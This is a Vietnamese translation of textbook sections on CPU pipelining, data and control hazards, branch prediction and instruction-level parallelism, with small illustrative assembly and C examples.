<div style="break-before: page; page-break-before: always;"></div><h2 id="57-pipelining-làm-cho-cpu-nhanh-hơn"><a class="header" href="#57-pipelining-làm-cho-cpu-nhanh-hơn">5.7. Pipelining: Làm cho CPU nhanh hơn</a></h2>
<p>CPU bốn giai đoạn của chúng ta cần bốn chu kỳ xung nhịp để thực thi một lệnh: chu kỳ đầu tiên dùng để nạp lệnh từ bộ nhớ; chu kỳ thứ hai để giải code lệnh và đọc toán hạng từ register file; chu kỳ thứ ba để ALU thực hiện phép toán; và chu kỳ thứ tư để ghi kết quả từ ALU vào một thanh ghi trong register file. Để thực thi một chuỗi gồm <em>N</em> lệnh, CPU cần <em>4N</em> chu kỳ xung nhịp, vì mỗi lệnh được thực thi tuần tự, từng cái một.</p>
<p><img src="C5-Arch/_images/4instrcycles.png" alt="12 cycles to complete 3 instruction" /></p>
<p><strong>Hình 1. Thực thi ba lệnh cần tổng cộng 12 chu kỳ.</strong></p>
<p>Hình 1 minh họa ba lệnh cần tổng cộng 12 chu kỳ để thực thi, tức là bốn chu kỳ cho mỗi lệnh, dẫn đến CPI bằng 4 (CPI là số chu kỳ trung bình để thực thi một lệnh). Tuy nhiên, mạch điều khiển của CPU có thể được cải tiến để đạt giá trị CPI tốt hơn (thấp hơn).</p>
<p>Khi xem xét mô hình thực thi mà mỗi lệnh cần bốn chu kỳ, rồi lệnh tiếp theo cũng cần bốn chu kỳ, và cứ thế tiếp tục, ta thấy rằng mạch CPU tương ứng với mỗi giai đoạn chỉ thực sự hoạt động một lần mỗi bốn chu kỳ. Ví dụ, sau giai đoạn Fetch, mạch fetch trong CPU không được sử dụng để thực hiện bất kỳ hành động hữu ích nào liên quan đến việc thực thi lệnh trong ba chu kỳ tiếp theo. Tuy nhiên, nếu mạch fetch có thể tiếp tục thực hiện giai đoạn Fetch của các lệnh tiếp theo trong ba chu kỳ đó, thì CPU có thể hoàn thành việc thực thi nhiều hơn một lệnh mỗi bốn chu kỳ.</p>
<p><strong>CPU pipelining</strong> là ý tưởng bắt đầu thực thi lệnh tiếp theo trước khi lệnh hiện tại hoàn tất. CPU pipelining vẫn thực thi lệnh theo thứ tự, nhưng cho phép các lệnh trong chuỗi được thực thi chồng lấn nhau. Ví dụ, trong chu kỳ đầu tiên, lệnh đầu tiên bước vào giai đoạn Fetch. Trong chu kỳ thứ hai, lệnh đầu tiên chuyển sang giai đoạn Decode, và đồng thời lệnh thứ hai bước vào giai đoạn Fetch. Trong chu kỳ thứ ba, lệnh đầu tiên chuyển sang giai đoạn Execute, lệnh thứ hai sang Decode, và lệnh thứ ba được nạp từ bộ nhớ. Trong chu kỳ thứ tư, lệnh đầu tiên chuyển sang giai đoạn WriteBack và hoàn tất, lệnh thứ hai sang Execute, lệnh thứ ba sang Decode, và lệnh thứ tư bước vào giai đoạn Fetch. Tại thời điểm này, pipeline của CPU đã đầy — mỗi giai đoạn của CPU đang thực thi một lệnh chương trình, và mỗi lệnh tiếp theo cách lệnh trước đó một giai đoạn. Khi pipeline đầy, CPU hoàn tất việc thực thi một lệnh mỗi chu kỳ xung nhịp!</p>
<p><img src="C5-Arch/_images/pipeline.png" alt="pipelined execution of instructions" /></p>
<p><strong>Hình 2. Pipelining: chồng lấn việc thực thi lệnh để đạt một lệnh hoàn tất mỗi chu kỳ.</strong><br />
Vòng tròn biểu thị trạng thái ổn định khi CPU hoàn tất một lệnh mỗi chu kỳ.</p>
<p>Hình 2 minh họa ví dụ về thực thi lệnh kiểu pipeline trong CPU của chúng ta. Bắt đầu từ chu kỳ xung nhịp thứ tư, pipeline đầy, nghĩa là CPU hoàn tất một lệnh mỗi chu kỳ, đạt CPI bằng 1 (được biểu thị bằng vòng tròn trong Hình 2). Lưu ý rằng tổng số chu kỳ cần để thực thi một lệnh đơn (gọi là <strong>latency</strong> của lệnh) không giảm trong thực thi kiểu pipeline — mỗi lệnh vẫn cần bốn chu kỳ để hoàn tất. Thay vào đó, pipelining làm tăng <strong>throughput</strong> của lệnh — tức là số lượng lệnh CPU có thể thực thi trong một khoảng thời gian nhất định — bằng cách chồng lấn việc thực thi các lệnh tuần tự theo kiểu so le qua các giai đoạn khác nhau của pipeline.</p>
<p>Từ những năm 1970, các kiến trúc sư máy tính đã sử dụng pipelining như một cách để cải thiện mạnh mẽ hiệu năng của vi xử lý. Tuy nhiên, pipelining phải đánh đổi bằng việc thiết kế CPU phức tạp hơn so với thiết kế không hỗ trợ thực thi kiểu pipeline. Cần thêm mạch lưu trữ và điều khiển để hỗ trợ pipelining. Ví dụ, có thể cần nhiều thanh ghi lệnh để lưu trữ các lệnh đang nằm trong pipeline. Mặc dù phức tạp hơn, nhưng lợi ích về CPI mà pipelining mang lại gần như luôn xứng đáng. Do đó, hầu hết các vi xử lý hiện đại đều triển khai thực thi kiểu pipeline.</p>
<p>Ý tưởng pipelining cũng được sử dụng trong nhiều ngữ cảnh khác trong khoa học máy tính để tăng tốc độ thực thi, và cũng áp dụng cho nhiều lĩnh vực ngoài ngành CNTT. Ví dụ, hãy xem việc giặt nhiều mẻ quần áo bằng một máy giặt. Nếu mỗi mẻ giặt gồm bốn bước (giặt, sấy, gấp, cất quần áo), thì sau khi giặt xong mẻ đầu tiên, ta có thể cho mẻ thứ hai vào máy giặt trong khi mẻ đầu tiên đang được sấy — tức là chồng lấn việc giặt các mẻ để rút ngắn tổng thời gian giặt bốn mẻ. Dây chuyền lắp ráp trong nhà máy cũng là một ví dụ điển hình của pipelining.</p>
<p>Trong phần thảo luận về cách CPU thực thi lệnh chương trình và pipelining, ta đã sử dụng pipeline đơn giản gồm bốn giai đoạn và ví dụ lệnh ADD. Để thực thi các lệnh nạp và lưu dữ liệu giữa bộ nhớ và thanh ghi, cần dùng pipeline năm giai đoạn. Pipeline năm giai đoạn bao gồm thêm giai đoạn Memory để truy cập bộ nhớ: Fetch–Decode–Execute–Memory–WriteBack. Các bộ xử lý khác nhau có thể có ít hoặc nhiều giai đoạn pipeline hơn so với pipeline năm giai đoạn điển hình. Ví dụ, kiến trúc ARM ban đầu có ba giai đoạn (Fetch, Decode và Execute, trong đó giai đoạn Execute thực hiện cả phép toán ALU và ghi kết quả vào register file). Các kiến trúc ARM hiện đại có nhiều hơn năm giai đoạn trong pipeline. Kiến trúc Intel Pentium ban đầu có pipeline năm giai đoạn, nhưng các kiến trúc sau đó có số giai đoạn pipeline nhiều hơn đáng kể. Ví dụ, Intel Core i7 có pipeline gồm 14 giai đoạn.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="58-các-vấn-đề-nâng-cao-trong-thực-thi-lệnh-kiểu-pipeline"><a class="header" href="#58-các-vấn-đề-nâng-cao-trong-thực-thi-lệnh-kiểu-pipeline">5.8. Các vấn đề nâng cao trong thực thi lệnh kiểu pipeline</a></h2>
<p>Hãy nhớ rằng <a href="C5-Arch/pipelining.html#_pipelining_making_the_cpu_faster">pipelining</a> giúp cải thiện hiệu năng của bộ xử lý bằng cách chồng lấn quá trình thực thi của nhiều lệnh. Trong <a href="C5-Arch/pipelining.html#_pipelining_making_the_cpu_faster">phần thảo luận trước</a> về pipelining, ta đã mô tả một pipeline đơn giản gồm bốn giai đoạn cơ bản: Fetch (F), Decode (D), Execute (E) và WriteBack (W). Trong phần thảo luận tiếp theo, ta sẽ bổ sung thêm giai đoạn thứ năm là Memory (M), đại diện cho việc truy cập bộ nhớ dữ liệu. Do đó, pipeline năm giai đoạn của chúng ta bao gồm:</p>
<ul>
<li><strong>Fetch (F):</strong> đọc một lệnh từ bộ nhớ (được chỉ định bởi program counter).</li>
<li><strong>Decode (D):</strong> đọc các thanh ghi nguồn và thiết lập logic điều khiển.</li>
<li><strong>Execute (E):</strong> thực thi lệnh.</li>
<li><strong>Memory (M):</strong> đọc hoặc ghi dữ liệu từ/đến bộ nhớ.</li>
<li><strong>WriteBack (W):</strong> ghi kết quả vào thanh ghi đích.</li>
</ul>
<p>Hãy nhớ rằng trình biên dịch sẽ chuyển các dòng mã nguồn thành chuỗi lệnh code máy để CPU thực thi. Mã assembly là phiên bản dễ đọc của code máy. Đoạn code dưới đây minh họa một chuỗi lệnh assembly giả định:</p>
<pre><code class="language-asm">MOV M[0x84], Reg1     # chuyển giá trị tại địa chỉ bộ nhớ 0x84 vào thanh ghi Reg1
ADD 2, Reg1, Reg1     # cộng 2 vào giá trị trong Reg1 và lưu kết quả vào Reg1
MOV 4, Reg2           # sao chép giá trị 4 vào thanh ghi Reg2
ADD Reg2, Reg2, Reg2  # tính Reg2 + Reg2, lưu kết quả vào Reg2
JMP L1&lt;0x14&gt;          # nhảy đến đoạn code tại L1 (địa chỉ code 0x14)
</code></pre>
<p>Đừng lo nếu bạn chưa hiểu rõ đoạn code trên — ta sẽ tìm hiểu chi tiết về assembly trong <a href="C5-Arch/../C7-x86_64/index.html#_assembly_chapter">các chương sau</a>. Hiện tại, bạn chỉ cần nắm các điểm sau:</p>
<ul>
<li>Mỗi ISA định nghĩa một tập hợp lệnh.</li>
<li>Mỗi lệnh hoạt động trên một hoặc nhiều toán hạng (ví dụ: thanh ghi, bộ nhớ hoặc hằng số).</li>
<li>Không phải lệnh nào cũng cần cùng số giai đoạn pipeline để thực thi.</li>
</ul>
<p>Trong phần thảo luận trước, ta giả định rằng mọi lệnh đều mất cùng số chu kỳ để thực thi; tuy nhiên, thực tế không phải vậy. Ví dụ, lệnh <code>MOV</code> đầu tiên cần cả năm giai đoạn vì nó di chuyển dữ liệu từ bộ nhớ vào thanh ghi. Ngược lại, ba lệnh tiếp theo chỉ cần bốn giai đoạn (F, D, E, W) vì chúng chỉ thao tác trên thanh ghi, không truy cập bộ nhớ. Lệnh cuối cùng (<code>JMP</code>) là một loại lệnh <em>nhảy</em> hoặc <em>rẽ nhánh có điều kiện</em>. Mục đích của nó là chuyển luồng điều khiển sang một phần khác của code. Cụ thể, các địa chỉ trong vùng code của bộ nhớ tham chiếu đến các <em>lệnh</em> khác trong tệp thực thi. Vì lệnh <code>JMP</code> không cập nhật thanh ghi đa dụng nào, giai đoạn WriteBack được bỏ qua, nên chỉ cần ba giai đoạn (F, D, E). Ta sẽ tìm hiểu chi tiết về lệnh điều kiện trong <a href="C5-Arch/../C7-x86_64/conditional_control_loops.html#_conditional_control_and_loops">các chương sau</a> về assembly.</p>
<p>Một <strong>pipeline stall</strong> (đình trệ pipeline) xảy ra khi một lệnh buộc phải chờ lệnh khác hoàn tất trước khi có thể tiếp tục. Trình biên dịch và bộ xử lý sẽ cố gắng hết sức để tránh các pipeline stall nhằm tối đa hóa hiệu năng.</p>
<h3 id="581-vấn-đề-trong-pipeline-data-hazards"><a class="header" href="#581-vấn-đề-trong-pipeline-data-hazards">5.8.1. Vấn đề trong pipeline: Data Hazards</a></h3>
<p><strong>Data hazard</strong> (xung đột dữ liệu) xảy ra khi hai lệnh cố gắng truy cập cùng một dữ liệu trong pipeline. Ví dụ, hãy xem cặp lệnh đầu tiên trong đoạn code ở trên:</p>
<pre><code class="language-asm">MOV M[0x84], Reg1     # chuyển giá trị tại địa chỉ bộ nhớ 0x84 vào thanh ghi Reg1
ADD 2, Reg1, Reg1     # cộng 2 vào giá trị trong Reg1 và lưu kết quả vào Reg1
</code></pre>
<p><img src="C5-Arch/_images/dataHazard1.png" alt="data hazard" /></p>
<p><strong>Hình 1. Ví dụ về xung đột pipeline khi hai lệnh đồng thời đến cùng một giai đoạn.</strong></p>
<p>Lệnh <code>MOV</code> cần năm giai đoạn (vì có truy cập bộ nhớ), trong khi lệnh <code>ADD</code> chỉ cần bốn. Trong trường hợp này, cả hai lệnh sẽ cố gắng ghi vào thanh ghi <code>Reg1</code> cùng lúc (xem Hình 1).</p>
<p>Bộ xử lý ngăn tình huống này bằng cách buộc mọi lệnh đều phải đi qua năm giai đoạn pipeline. Với các lệnh vốn chỉ cần ít hơn năm giai đoạn, CPU sẽ thêm một lệnh “không thao tác” (<code>NOP</code>) — còn gọi là “bubble” trong pipeline — để thay thế cho giai đoạn bị thiếu.</p>
<p>Tuy nhiên, vấn đề vẫn chưa được giải quyết hoàn toàn. Vì mục tiêu của lệnh thứ hai là cộng <code>2</code> vào giá trị trong <code>Reg1</code>, nên lệnh <code>MOV</code> cần hoàn tất việc <em>ghi</em> vào <code>Reg1</code> trước khi lệnh <code>ADD</code> có thể thực thi chính xác. Một vấn đề tương tự cũng xảy ra với hai lệnh tiếp theo:</p>
<pre><code class="language-asm">MOV 4, Reg2           # sao chép giá trị 4 vào thanh ghi Reg2
ADD Reg2, Reg2, Reg2  # tính Reg2 + Reg2, lưu kết quả vào Reg2
</code></pre>
<p><img src="C5-Arch/_images/dataHazard2.png" alt="data hazard 2" /></p>
<p><strong>Hình 2. Bộ xử lý có thể giảm thiệt hại do xung đột pipeline bằng cách chuyển tiếp toán hạng giữa các lệnh.</strong></p>
<p>Hai lệnh này nạp giá trị <code>4</code> vào thanh ghi <code>Reg2</code>, sau đó nhân đôi nó (bằng cách cộng với chính nó). Một lần nữa, các bubble được thêm vào để đảm bảo mỗi lệnh đi qua đủ năm giai đoạn. Tuy nhiên, trong trường hợp này, giai đoạn thực thi của lệnh thứ hai xảy ra <em>trước</em> khi lệnh đầu tiên hoàn tất việc ghi giá trị <code>4</code> vào <code>Reg2</code>.</p>
<p>Việc thêm nhiều bubble là một giải pháp không tối ưu, vì nó làm pipeline bị đình trệ. Thay vào đó, bộ xử lý sử dụng kỹ thuật gọi là <strong>operand forwarding</strong> (&quot;chuyển tiếp toán hạng&quot;), trong đó pipeline sẽ đọc kết quả từ phép toán trước đó. Nhìn vào Hình 2, khi lệnh <code>MOV 4, Reg2</code> đang thực thi, nó sẽ chuyển tiếp kết quả cho lệnh <code>ADD Reg2, Reg2, Reg2</code>. Như vậy, trong khi lệnh <code>MOV</code> đang ghi vào <code>Reg2</code>, lệnh <code>ADD</code> vẫn có thể sử dụng giá trị mới của <code>Reg2</code> mà nó nhận được từ lệnh <code>MOV</code>.</p>
<h3 id="582-các-vấn-đề-trong-pipeline-control-hazards"><a class="header" href="#582-các-vấn-đề-trong-pipeline-control-hazards">5.8.2. Các vấn đề trong pipeline: Control Hazards</a></h3>
<p>Pipeline được tối ưu hóa cho các lệnh xảy ra liên tiếp. Tuy nhiên, sự thay đổi luồng điều khiển trong chương trình — phát sinh từ các cấu trúc điều kiện như câu lệnh <code>if</code> hoặc vòng lặp — có thể ảnh hưởng nghiêm trọng đến hiệu năng của pipeline. Hãy cùng xem một đoạn code ví dụ khác, viết bằng C:</p>
<pre><code class="language-c">int result = *x; // x là con trỏ đến một số nguyên
int temp = *y;   // y là con trỏ đến một số nguyên khác

if (result &lt;= temp) {
    result = result - temp;
}
else {
    result = result + temp;
}
return result;
</code></pre>
<p>Đoạn code này đơn giản chỉ đọc dữ liệu kiểu số nguyên từ hai con trỏ khác nhau, so sánh giá trị, rồi thực hiện phép toán khác nhau tùy theo kết quả. Dưới đây là cách đoạn code trên có thể được chuyển thành lệnh assembly:</p>
<pre><code class="language-asm">MOV M[0x84], Reg1     # chuyển giá trị tại địa chỉ bộ nhớ 0x84 vào thanh ghi Reg1
MOV M[0x88], Reg2     # chuyển giá trị tại địa chỉ bộ nhớ 0x88 vào thanh ghi Reg2
CMP Reg1, Reg2        # so sánh giá trị trong Reg1 với Reg2
JLE L1&lt;0x14&gt;          # nhảy đến L1 nếu Reg1 nhỏ hơn hoặc bằng Reg2
ADD Reg1, Reg2, Reg1  # tính Reg1 + Reg2, lưu kết quả vào Reg1
JMP L2&lt;0x20&gt;          # nhảy đến L2 (địa chỉ code 0x20)
L1:
SUB Reg1, Reg2, Reg1  # tính Reg1 - Reg2, lưu kết quả vào Reg1
L2:
RET                   # trả về từ hàm
</code></pre>
<p>Chuỗi lệnh này nạp dữ liệu từ bộ nhớ vào hai thanh ghi riêng biệt, so sánh giá trị, rồi thực hiện phép toán khác nhau tùy theo việc giá trị trong thanh ghi đầu tiên có nhỏ hơn giá trị trong thanh ghi thứ hai hay không. Câu lệnh <code>if</code> trong ví dụ trên được biểu diễn bằng hai lệnh: lệnh so sánh (<code>CMP</code>) và lệnh nhảy có điều kiện nhỏ hơn hoặc bằng (<code>JLE</code>). Ta sẽ tìm hiểu chi tiết hơn về các lệnh điều kiện trong <a href="C5-Arch/../C7-x86_64/conditional_control_loops.html#_conditional_control_and_loops">các chương assembly sau</a>; hiện tại bạn chỉ cần hiểu rằng lệnh <code>CMP</code> dùng để <em>so sánh</em> hai thanh ghi, còn lệnh <code>JLE</code> là một loại lệnh nhánh đặc biệt, chuyển luồng thực thi sang phần khác của chương trình <em>chỉ khi</em> điều kiện (trong trường hợp này là “nhỏ hơn hoặc bằng”) đúng.</p>
<blockquote>
<p>Nhìn vào assembly lần đầu có thể khiến bạn thấy choáng ngợp — điều đó hoàn toàn bình thường!<br />
Nếu bạn cảm thấy như vậy, đừng lo lắng. Ta sẽ tìm hiểu chi tiết về assembly trong <a href="C5-Arch/../C7-x86_64/index.html#_assembly_chapter">các chương sau</a>.<br />
Điều quan trọng cần ghi nhớ là: code chứa câu lệnh điều kiện cũng được dịch thành chuỗi lệnh assembly giống như bất kỳ đoạn code nào khác.<br />
Tuy nhiên, khác với các đoạn code khác, câu lệnh điều kiện <em>không</em> đảm bảo sẽ thực thi theo một cách cụ thể.<br />
Sự không chắc chắn trong cách thực thi của câu lệnh điều kiện có ảnh hưởng lớn đến pipeline.</p>
</blockquote>
<p><img src="C5-Arch/_images/controlHazardprb.png" alt="conditional hazard 1" /></p>
<p><strong>Hình 3. Ví dụ về control hazard phát sinh từ một lệnh nhánh có điều kiện.</strong></p>
<p><strong>Control hazard</strong> (xung đột điều khiển) xảy ra khi pipeline gặp một lệnh nhánh (hoặc điều kiện). Khi điều này xảy ra, pipeline phải “đoán” xem nhánh có được thực hiện hay không. Nếu nhánh không được thực hiện, quá trình sẽ tiếp tục thực thi các lệnh tiếp theo trong chuỗi. Hãy xem ví dụ trong Hình 3. Nếu nhánh được thực hiện, lệnh tiếp theo cần thực thi sẽ là <code>SUB</code>. Tuy nhiên, ta không thể biết liệu nhánh có được thực hiện hay không cho đến khi lệnh <code>JLE</code> hoàn tất. Tại thời điểm đó, các lệnh <code>ADD</code> và <code>JMP</code> đã được nạp vào pipeline. Nếu nhánh <em>được</em> thực hiện, các lệnh “rác” này trong pipeline cần được loại bỏ — hay còn gọi là <strong>flush</strong> — trước khi pipeline có thể được nạp lại với các lệnh mới. Việc flush pipeline là rất tốn kém.</p>
<p>Có một số giải pháp mà các kỹ sư phần cứng có thể lựa chọn để giúp bộ xử lý xử lý control hazard:</p>
<ul>
<li>
<p><strong>Stall pipeline</strong>: Là giải pháp đơn giản nhất — mỗi khi gặp lệnh nhánh, thêm nhiều lệnh <code>NOP</code> (bubble) và tạm dừng pipeline cho đến khi bộ xử lý chắc chắn nhánh có được thực hiện hay không. Mặc dù cách này giải quyết được vấn đề, nhưng nó gây ảnh hưởng lớn đến hiệu năng (xem Hình 4).</p>
</li>
<li>
<p><strong>Branch prediction</strong>: Giải pháp phổ biến nhất là sử dụng <strong>branch predictor</strong> (bộ dự đoán nhánh), dự đoán hướng đi của nhánh dựa trên các lần thực thi trước đó. Các bộ dự đoán nhánh hiện đại rất chính xác. Tuy nhiên, cách tiếp cận này gần đây đã gây ra một số lỗ hổng bảo mật (ví dụ: Spectre<sup class="footnote-reference"><a href="#1">1</a></sup>). Hình 4 minh họa cách bộ dự đoán nhánh xử lý control hazard.</p>
</li>
<li>
<p><strong>Eager execution</strong>: Trong eager execution, CPU sẽ thực thi cả hai nhánh và thực hiện chuyển dữ liệu có điều kiện thay vì chuyển luồng điều khiển (được triển khai thông qua lệnh <code>cmov</code> trong x86 và <code>csel</code> trong ARMv8-A). Việc chuyển dữ liệu có điều kiện cho phép bộ xử lý tiếp tục thực thi mà không làm gián đoạn pipeline. Tuy nhiên, không phải đoạn code nào cũng có thể tận dụng eager execution, và nó có thể nguy hiểm trong trường hợp truy cập con trỏ hoặc có hiệu ứng phụ.</p>
</li>
</ul>
<p><img src="C5-Arch/_images/controlHazardsol.png" alt="conditional hazard 2" /></p>
<p><strong>Hình 4. Các giải pháp tiềm năng để xử lý control hazard.</strong></p>
<h3 id="references"><a class="header" href="#references">References</a></h3>
<ol>
<li>Peter Bright. <a href="https://arstechnica.com/gadgets/2019/02/google-software-is-never-going-to-be-able-to-fix-spectre-type-bugs/">Google: Software is never going to be able to fix
Spectre-type
bugs</a>
<em>Ars Technica</em> 2019.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="59-nhìn-về-phía-trước-cpu-ngày-nay"><a class="header" href="#59-nhìn-về-phía-trước-cpu-ngày-nay">5.9. Nhìn về phía trước: CPU ngày nay</a></h2>
<p>Kỹ thuật pipeline trong CPU là một ví dụ của <strong>instruction-level parallelism</strong> (ILP – &quot;song song ở cấp độ lệnh&quot;), trong đó CPU thực thi đồng thời nhiều lệnh song song. Trong thực thi kiểu pipeline, CPU thực hiện đồng thời nhiều lệnh bằng cách chồng lấn quá trình thực thi của chúng trong pipeline. Một CPU pipeline đơn giản có thể đạt CPI bằng 1, tức là hoàn thành một lệnh mỗi chu kỳ xung nhịp. Các vi xử lý hiện đại thường sử dụng pipeline kết hợp với các kỹ thuật ILP khác và bao gồm nhiều nhân CPU để đạt CPI nhỏ hơn 1. Với các vi kiến trúc này, số lượng trung bình <strong>instructions per cycle</strong> (IPC – &quot;lệnh mỗi chu kỳ&quot;) là chỉ số thường dùng để mô tả hiệu năng. IPC lớn cho thấy bộ xử lý đạt mức độ thực thi lệnh đồng thời cao và ổn định.</p>
<p>Transistor là khối xây dựng của mọi mạch trên mạch tích hợp (chip). Các đơn vị xử lý và điều khiển của CPU hiện đại được xây dựng từ các mạch, mà bản thân chúng được tạo thành từ các mạch con và cổng logic cơ bản, được triển khai bằng transistor. Transistor cũng được dùng để triển khai các mạch lưu trữ trong thanh ghi CPU và bộ nhớ đệm (cache) tốc độ cao trên chip, nơi lưu bản sao của dữ liệu và lệnh vừa được truy cập gần đây (ta sẽ thảo luận chi tiết về bộ nhớ cache trong <a href="C5-Arch/../C11-MemHierarchy/index.html#_storage_and_the_memory_hierarchy">Chương 11</a>).</p>
<p>Số lượng transistor có thể đặt trên một chip là một chỉ số sơ bộ về hiệu năng của nó. <strong>Định luật Moore</strong> là một quan sát do Gordon Moore đưa ra năm 1975, rằng số lượng transistor trên mỗi mạch tích hợp sẽ tăng gấp đôi khoảng mỗi hai năm<sup class="footnote-reference"><a href="#1,^2">1</a></sup>. Việc số lượng transistor trên chip tăng gấp đôi mỗi hai năm có nghĩa là các kiến trúc sư máy tính có thể thiết kế chip mới với gấp đôi không gian dành cho mạch lưu trữ và tính toán, từ đó hiệu năng cũng tăng gần gấp đôi. Trong lịch sử, các kiến trúc sư máy tính đã sử dụng số transistor tăng thêm để thiết kế các bộ xử lý đơn phức tạp hơn, sử dụng các kỹ thuật ILP nhằm cải thiện hiệu năng tổng thể.</p>
<h3 id="591-song-song-ở-cấp-độ-lệnh-instruction-level-parallelism"><a class="header" href="#591-song-song-ở-cấp-độ-lệnh-instruction-level-parallelism">5.9.1. Song song ở cấp độ lệnh (Instruction-Level Parallelism)</a></h3>
<p>Instruction-level parallelism (ILP) là thuật ngữ chỉ tập hợp các kỹ thuật thiết kế dùng để hỗ trợ thực thi song song các lệnh của một chương trình đơn trên một bộ xử lý đơn. Các kỹ thuật ILP là minh bạch đối với lập trình viên, nghĩa là lập trình viên viết chương trình C tuần tự, nhưng bộ xử lý sẽ thực thi nhiều lệnh của chương trình đó đồng thời, song song, trên một hoặc nhiều đơn vị thực thi. Pipeline là một ví dụ của ILP, trong đó một chuỗi lệnh chương trình được thực thi đồng thời, mỗi lệnh ở một giai đoạn khác nhau trong pipeline. Một bộ xử lý pipeline có thể thực thi một lệnh mỗi chu kỳ (đạt IPC bằng 1). Các thiết kế vi xử lý ILP khác có thể thực thi nhiều hơn một lệnh mỗi chu kỳ xung nhịp và đạt IPC lớn hơn 1.</p>
<p>Một <strong>vector processor</strong> là một kiến trúc triển khai ILP thông qua các lệnh vector đặc biệt, nhận các mảng một chiều (vector) dữ liệu làm toán hạng. Các lệnh vector được thực thi song song bởi vector processor trên nhiều đơn vị thực thi, mỗi đơn vị thực hiện một phép toán trên từng phần tử của toán hạng vector. Trước đây, vector processor thường được sử dụng trong các máy tính song song quy mô lớn. Siêu máy tính Cray-1 ra mắt năm 1976 là siêu máy tính đầu tiên dựa trên vector processor, và Cray tiếp tục thiết kế các siêu máy tính dùng vector processor trong suốt thập niên 1990. Tuy nhiên, thiết kế này cuối cùng không thể cạnh tranh với các thiết kế siêu máy tính song song khác, và ngày nay vector processor chủ yếu xuất hiện trong các thiết bị tăng tốc như GPU (graphics processing unit – &quot;bộ xử lý đồ họa&quot;), vốn được tối ưu hóa đặc biệt để xử lý dữ liệu hình ảnh lưu dưới dạng mảng một chiều.</p>
<p><strong>Superscalar</strong> là một ví dụ khác về thiết kế bộ xử lý ILP. Một bộ xử lý superscalar là bộ xử lý đơn có nhiều đơn vị thực thi và nhiều pipeline thực thi. Superscalar processor sẽ nạp một tập hợp lệnh từ dòng lệnh tuần tự của chương trình, và phân tách chúng thành nhiều dòng lệnh độc lập được thực thi song song bởi các đơn vị thực thi. Superscalar processor là một <strong>out-of-order processor</strong> (&quot;bộ xử lý thực thi không theo thứ tự&quot;), tức là nó thực thi các lệnh không theo thứ tự xuất hiện trong dòng lệnh tuần tự. Việc thực thi không theo thứ tự đòi hỏi phải xác định các chuỗi lệnh không có phụ thuộc, có thể thực thi song song một cách an toàn. Superscalar processor có chức năng tạo động các dòng lệnh độc lập để đưa vào các đơn vị thực thi. Chức năng này phải thực hiện phân tích phụ thuộc để đảm bảo thứ tự đúng của bất kỳ lệnh nào phụ thuộc vào kết quả của lệnh trước đó trong dòng lệnh tuần tự. Ví dụ, một superscalar processor với năm đơn vị thực thi có pipeline có thể thực thi năm lệnh từ một chương trình tuần tự trong một chu kỳ (đạt IPC bằng 5). Tuy nhiên, do phụ thuộc giữa các lệnh, không phải lúc nào superscalar processor cũng có thể giữ cho tất cả pipeline đều hoạt động.</p>
<p><strong>Very long instruction word</strong> (VLIW) là một thiết kế vi kiến trúc ILP khác, tương tự superscalar. Tuy nhiên, trong kiến trúc VLIW, trình biên dịch chịu trách nhiệm xây dựng các dòng lệnh độc lập được thực thi song song bởi bộ xử lý. Trình biên dịch cho kiến trúc VLIW sẽ phân tích các lệnh chương trình để xây dựng tĩnh một lệnh VLIW gồm nhiều lệnh, mỗi lệnh thuộc một dòng lệnh độc lập. VLIW dẫn đến thiết kế bộ xử lý đơn giản hơn so với superscalar, vì bộ xử lý VLIW không cần thực hiện phân tích phụ thuộc để xây dựng các dòng lệnh độc lập trong quá trình thực thi. Thay vào đó, bộ xử lý VLIW chỉ cần thêm mạch để nạp lệnh VLIW tiếp theo và tách nó thành các lệnh riêng biệt để đưa vào từng pipeline thực thi. Tuy nhiên, vì đẩy việc phân tích phụ thuộc sang trình biên dịch, kiến trúc VLIW đòi hỏi trình biên dịch chuyên biệt để đạt hiệu năng tốt.</p>
<p>Một vấn đề chung của cả superscalar và VLIW là mức độ hiệu năng song song thường bị giới hạn đáng kể bởi bản chất tuần tự của các chương trình ứng dụng mà chúng thực thi. Các phụ thuộc giữa các lệnh trong chương trình làm hạn chế khả năng giữ cho tất cả pipeline đều hoạt động.</p>
<h3 id="592-bộ-xử-lý-đa-nhân-và-đa-luồng-phần-cứng"><a class="header" href="#592-bộ-xử-lý-đa-nhân-và-đa-luồng-phần-cứng">5.9.2. Bộ xử lý đa nhân và đa luồng phần cứng</a></h3>
<p>Bằng cách thiết kế các bộ xử lý đơn sử dụng ngày càng nhiều kỹ thuật ILP phức tạp và tăng tần số xung nhịp CPU để điều khiển các chức năng ngày càng phức tạp này, các kiến trúc sư máy tính đã tạo ra những bộ xử lý có hiệu năng theo kịp Định luật Moore cho đến đầu những năm 2000. Sau thời điểm đó, tần số xung nhịp CPU không thể tiếp tục tăng mà không làm tăng đáng kể mức tiêu thụ điện năng của bộ xử lý<sup class="footnote-reference"><a href="#3">2</a></sup>. Điều này dẫn đến kỷ nguyên hiện tại của các vi kiến trúc đa nhân (multicore) và đa luồng phần cứng (hardware multithreading), cả hai đều yêu cầu lập trình viên phải thực hiện <em>explicit parallel programming</em> (&quot;lập trình song song tường minh&quot;) để tăng tốc độ thực thi của một chương trình đơn.</p>
<p><strong>Hardware multithreading</strong> là thiết kế bộ xử lý đơn hỗ trợ thực thi nhiều luồng phần cứng. Một <strong>thread</strong> (luồng) là một dòng thực thi độc lập. Ví dụ, hai chương trình đang chạy sẽ có hai luồng thực thi độc lập. Hai luồng này có thể được hệ điều hành lập lịch để chạy “đồng thời” trên một bộ xử lý đa luồng. Hardware multithreading có thể được triển khai bằng cách cho bộ xử lý luân phiên thực thi các lệnh từ mỗi dòng lệnh của các luồng trong mỗi chu kỳ. Trong trường hợp này, các lệnh từ các luồng phần cứng khác nhau không được thực thi đồng thời trong cùng một chu kỳ. Thay vào đó, bộ xử lý được thiết kế để chuyển đổi nhanh chóng giữa các dòng lệnh của các luồng khác nhau. Điều này thường giúp tăng tốc độ thực thi tổng thể so với khi chạy trên bộ xử lý đơn luồng.</p>
